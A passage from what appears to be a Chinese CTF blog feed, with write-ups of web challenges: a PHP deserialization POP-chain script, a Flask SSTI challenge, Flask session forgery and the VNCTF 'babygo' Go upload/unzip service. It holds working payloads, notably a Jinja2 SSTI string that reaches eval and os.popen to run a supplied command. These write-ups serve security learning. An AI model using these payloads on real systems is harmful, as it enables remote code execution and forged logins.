class="variable">$shifted</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$char</span> = <span class="variable">$str</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$charset</span>, <span class="variable">$char</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pos</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$new_pos</span> = (<span class="variable">$pos</span> + <span class="variable">$shift</span> + <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>)) % <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>);</span><br><span class="line">            <span class="variable">$shifted</span> .= <span class="variable">$charset</span>[<span class="variable">$new_pos</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$shifted</span> .= <span class="variable">$char</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$shifted</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终链条 <code>w_wuw_w(__destruct) -&gt;gBoBg(__toString) -&gt;w_wuw_w(__invoke) -&gt;EeE(__clone) -&gt;cycycycy(aaa)</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前目录中有一个txt文件哦</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;src/check.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// w_wuw_w(__destruct) -&gt;gBoBg(__toString) -&gt;w_wuw_w(__invoke) -&gt;EeE(__clone) -&gt;cycycycy(aaa)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cycycycy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$eeee</span> = <span class="string">&quot;-_-&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> gBoBg;</span><br><span class="line"><span class="variable">$a</span>-&gt;coos = <span class="keyword">new</span> w_wuw_w;</span><br><span class="line"><span class="variable">$a</span>-&gt;file = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> w_wuw_w;</span><br><span class="line"><span class="variable">$b</span>-&gt;aaa = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decode</span>(<span class="string">&quot;p8vfuv8g8v8py&quot;</span>);</span><br><span class="line"><span class="comment"># O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:5:&quot;gBoBg&quot;:4:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:3:&quot;123&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;N;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;s:11:&quot; gBoBg eeee&quot;;s:3:&quot;-_-&quot;;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;</span></span><br><span class="line"><span class="comment"># fe1ka1ele1efp</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230408233852859.png" alt="image-20230408233852859"></p><h3 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h3><p>源码 app.zip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">name=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;hello.html&#x27;</span>,name=name)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hellodear</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ge&quot;</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;f&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Nonononon&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现就是一个简单的ssti</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(__import__(&#x27;flask&#x27;).request.args.get(&#x27;j&#x27;)).read()&quot;)&#125;&#125;?j=cat /flag</span><br></pre></td></tr></table></figure><h3 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h3><p>首先注册一个测试用户，例如账号1密码1</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230409213756405.png" alt="image-20230409213756405"></p><p>很明显的存在flask session</p><p>然后1里面有个learn的超链接，点进去以后可以得到部分源码</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230409213919740.png" alt="image-20230409213919740"></p><p>拿到了secret_key</p><p>于是这个来进行伪造admin登录</p><p>这里采用flask-unsign工具进行flask-session伪造，工具安装：<a href="https://github.com/Paradoxis/Flask-Unsign">Paradoxis/Flask-Unsign: Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys. (github.com)</a></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230409214309969.png" alt="image-20230409214309969"></p><p>然后访问页面，发现有个下载</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230409214835276.png" alt="image-20230409214835276"></p><p>然后下载这个项目源码默认一般是/app/app.py</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230409214943041.png" alt="image-20230409214943041"></p><p>然后发现有个hello路由可以执行rce</p><p>最终payload：</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230409215037897.png" alt="image-20230409215037897"></p>]]></content>
      
      
      <categories>
          
          <category> 复现赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF_babygo</title>
      <link href="/2023/02/23/VNCTF-babygo/"/>
      <url>/2023/02/23/VNCTF-babygo/</url>
      
        <content type="html"><![CDATA[<h2 id="babygo"><a href="#babygo" class="headerlink" title="babygo"></a>babygo</h2><p>这个题目确实挺baby的我初学者都能写</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/gob&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/PaulXu-cn/goeval&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/duke-git/lancet/cryptor&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/duke-git/lancet/fileutil&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/duke-git/lancet/random&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;path/filepath&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">Name  <span class="type">string</span></span><br><span class="line">Path  <span class="type">string</span></span><br><span class="line">Power <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">store := cookie.NewStore(random.RandBytes(<span class="number">16</span>))</span><br><span class="line">r.Use(sessions.Sessions(<span class="string">&quot;session&quot;</span>, store))</span><br><span class="line">r.LoadHTMLGlob(<span class="string">&quot;template/*&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">userDir := <span class="string">&quot;/tmp/&quot;</span> + cryptor.Md5String(c.ClientIP()+<span class="string">&quot;VNCTF2023GoGoGo~&quot;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line">session := sessions.Default(c)</span><br><span class="line">session.Set(<span class="string">&quot;shallow&quot;</span>, userDir) <span class="comment">// shallow = /tmp/4b997ad5487153fba0162e525abd6b7d/</span></span><br><span class="line">session.Save()</span><br><span class="line">fileutil.CreateDir(userDir)</span><br><span class="line">gobFile, _ := os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>) <span class="comment">// /tmp/4b997ad5487153fba0162e525abd6b7d/user.gob</span></span><br><span class="line">user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: userDir, Power: <span class="string">&quot;low&quot;</span>&#125;</span><br><span class="line">encoder := gob.NewEncoder(gobFile)</span><br><span class="line">encoder.Encode(user)</span><br><span class="line"><span class="keyword">if</span> fileutil.IsExist(userDir) &amp;&amp; fileutil.IsExist(userDir+<span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Your path: &quot;</span> + userDir&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to make user dir&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;upload me!&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.POST(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span></span><br><span class="line">fileutil.CreateDir(userUploadDir) <span class="comment">// /tmp/4b997ad5487153fba0162e525abd6b7d/uploads/</span></span><br><span class="line">file, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no file upload&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ext := file.Filename[strings.LastIndex(file.Filename, <span class="string">&quot;.&quot;</span>):]</span><br><span class="line"><span class="keyword">if</span> ext == <span class="string">&quot;.gob&quot;</span> || ext == <span class="string">&quot;.go&quot;</span> &#123;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hacker!&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">filename := userUploadDir + file.Filename</span><br><span class="line"><span class="keyword">if</span> fileutil.IsExist(filename) &#123;</span><br><span class="line">fileutil.RemoveFile(filename)</span><br><span class="line">&#125;</span><br><span class="line">err = c.SaveUploadedFile(file, filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to save file&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;file saved to &quot;</span> + filename&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/unzip&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span> <span class="comment">// /tmp/4b997ad5487153fba0162e525abd6b7d/uploads/</span></span><br><span class="line">files, _ := fileutil.ListFileNames(userUploadDir)</span><br><span class="line">destPath := filepath.Clean(userUploadDir + c.Query(<span class="string">&quot;path&quot;</span>))</span><br><span class="line"><span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;</span><br><span class="line"><span class="keyword">if</span> fileutil.MiMeType(userUploadDir+file) == <span class="string">&quot;application/zip&quot;</span> &#123;</span><br><span class="line">err := fileutil.UnZip(userUploadDir+file, destPath)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to unzip file&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fileutil.RemoveFile(userUploadDir + file)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;success unzip&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/backdoor&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">userDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>)</span><br><span class="line"><span class="keyword">if</span> fileutil.IsExist(userDir + <span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">file, _ := os.Open(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">decoder := gob.NewDecoder(file)</span><br><span class="line"><span class="keyword">var</span> ctfer User</span><br><span class="line">decoder.Decode(&amp;ctfer)</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span> ctfer.Power == <span class="string">&quot;admin&quot;</span> &#123; <span class="comment">//</span></span><br><span class="line">eval, err := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, c.DefaultQuery(<span class="string">&quot;pkg&quot;</span>, <span class="string">&quot;fmt&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="type">string</span>(eval)&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;low power&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no such user gob&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.Run(<span class="string">&quot;:80&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>挨个分析路由</p><p>首先是/</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    userDir := <span class="string">&quot;/tmp/&quot;</span> + cryptor.Md5String(c.ClientIP()+<span class="string">&quot;VNCTF2023GoGoGo~&quot;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line">    session := sessions.Default(c)</span><br><span class="line">    <span class="comment">// session中的shallow的值设置为userDir的值，并且保存这个session</span></span><br><span class="line">    session.Set(<span class="string">&quot;shallow&quot;</span>, userDir) </span><br><span class="line">    session.Save()</span><br><span class="line">    <span class="comment">// 用你的userDir创建一个目录</span></span><br><span class="line">    fileutil.CreateDir(userDir)</span><br><span class="line">    <span class="comment">// 在你的userdir里面创建user.gob文件</span></span><br><span class="line">    gobFile, _ := os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>) <span class="comment">// /tmp/4b997ad5487153fba0162e525abd6b7d/user.gob</span></span><br><span class="line">    user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: userDir, Power: <span class="string">&quot;low&quot;</span>&#125;</span><br><span class="line">    <span class="comment">// 对象序列化存入user.gob</span></span><br><span class="line">    encoder := gob.NewEncoder(gobFile)</span><br><span class="line">    encoder.Encode(user)</span><br><span class="line">    <span class="keyword">if</span> fileutil.IsExist(userDir) &amp;&amp; fileutil.IsExist(userDir+<span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">        c.HTML(<span class="number">200</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Your path: &quot;</span> + userDir&#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    c.HTML(<span class="number">500</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to make user dir&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>然后是/upload路由</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">r.GET(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;upload me!&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.POST(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    session := sessions.Default(c)</span><br><span class="line">    <span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">        c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span></span><br><span class="line">    fileutil.CreateDir(userUploadDir) <span class="comment">// /tmp/4b997ad5487153fba0162e525abd6b7d/uploads/</span></span><br><span class="line">    file, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no file upload&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    ext := file.Filename[strings.LastIndex(file.Filename, <span 